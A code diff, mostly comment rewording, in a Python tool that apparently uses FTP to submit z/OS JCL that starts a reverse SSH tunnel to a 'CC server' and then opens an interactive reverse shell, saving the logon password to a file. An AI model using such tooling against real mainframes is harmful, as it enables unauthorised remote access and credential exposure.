@@ -70,13 +70,15 @@ def parse_configuration():
     return(config_file, cli_args)
 
 if __name__ == '__main__':
-    # Config file from the command-line
+    # Get configuration from file and command line switches
     global_config, args = parse_configuration()
     config = global_config['ZOS']
 
+    # Set logging level
     if args.verbose:
         logging.basicConfig(level=logging.DEBUG)
 
+    # SSH keys and fingerprinting manager
     ssh = ssh_utils
 
     # SSH host fingerprint for the CC server
@@ -138,7 +140,7 @@ if __name__ == '__main__':
     logging.info('Creating the FIFO for the shell')
     mkfifo_step = Template(MKFIFO).substitute(FIFONAME=ftpfifoname)
 
-    # Run the JCL to start the SSH tunnel
+    # Generate the JCL to start the SSH tunnel
     logging.info('Running the reverse SSH command')
     testpath = ''
     if args.test:
@@ -160,9 +162,10 @@ if __name__ == '__main__':
     JCL = Job('FTPJOB')
     JCL.add_inline(mkfifo_step)
     JCL.add_inline(ssh_step)
+    # Submit the job
     ftp.run_jcl(JCL.render())
 
-    # Update the config in order to pass it to the shell
+    # Update the config object to pass it to the shell
     logging.info('Shell preparation')
     config['cc_server_fingerprint'] = cc_server_fingerprint.decode()
     config['key'] = key.decode()
@@ -171,7 +174,7 @@ if __name__ == '__main__':
     config['ftpfifoname'] = ftpfifoname
     config['ftpknownhosts'] = ftpknownhosts
 
-    # Prepare the reverse shell handling
+    # Reverse shell management
     if args.test:
         print('Skipping the shell activation, test mode on. Test file in %s', testpath)
     else:
@@ -181,9 +184,10 @@ if __name__ == '__main__':
                                     config=global_config)
         shell.cmdloop()
 
+    # Close the FTP connection
     ftp.close()
 
-    # Save the config?
+    # Save the config for future use
     if args.savestate is not None:
         logging.info('Saving the output configuration file')
         logging.warning('Saving the logon password to the file! You can remove it if you want ;)')
